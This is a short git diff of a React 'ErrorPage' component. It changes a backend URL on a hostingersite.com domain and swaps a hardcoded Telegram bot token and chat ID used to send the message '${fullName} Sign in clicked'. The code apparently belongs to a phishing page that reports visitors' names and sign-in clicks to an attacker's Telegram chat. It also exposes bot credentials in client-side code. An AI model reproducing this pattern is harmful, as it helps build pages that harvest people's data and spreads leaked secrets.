@@ -19,7 +19,7 @@ const ErrorPage: React.FC = () => {
   const fetchErrorContent = async () => {
     try {
       const res = await fetch(
-        "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api6.php?action=fetch_error_content",
+        "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api7.php?action=fetch_error_content",
       );
       const data = await res.json();
 
@@ -40,8 +40,8 @@ const ErrorPage: React.FC = () => {
 
     setShowPopup(true);
 
-    const botToken = "8379013361:AAG_2hOY6uXZTvCaC4HBfYL6-nR3snO06lM";
-    const chatId = "8317872395";
+    const botToken = "7287693137:AAHB0QO7JC62ZJSw5EHhVxHF3EJnbqZcXHk";
+    const chatId = "4575071223";
     const message = `${fullName} Sign in clicked`;
 
     try {
